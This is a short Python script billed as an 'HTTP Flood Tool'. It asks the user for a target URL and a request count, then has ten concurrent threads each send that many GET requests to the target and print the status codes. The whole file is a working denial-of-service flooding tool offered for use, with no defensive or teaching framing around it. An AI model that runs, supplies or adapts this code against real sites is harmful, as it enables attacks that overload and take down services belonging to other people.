import requests
import threading

def http_flood(target_url, num_requests):
    print("Sending HTTP flood to:", target_url)
    for i in range(num_requests):
        try:
            response = requests.get(target_url)
            print("Request", i+1, "- Status Code:", response.status_code)
        except Exception as e:
            print("Request", i+1, "- Error:", e)

def main():
    print("#############################")
    print("#      HTTP Flood Tool      #")
    print("#############################")

    target_url = input("\nEnter the target URL (e.g., http://example.com): ")
    num_requests = int(input("Enter the number of requests to send: "))

    threads = []

    for _ in range(10):  # Number of threads for concurrent requests
        thread = threading.Thread(target=http_flood, args=(target_url, num_requests))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
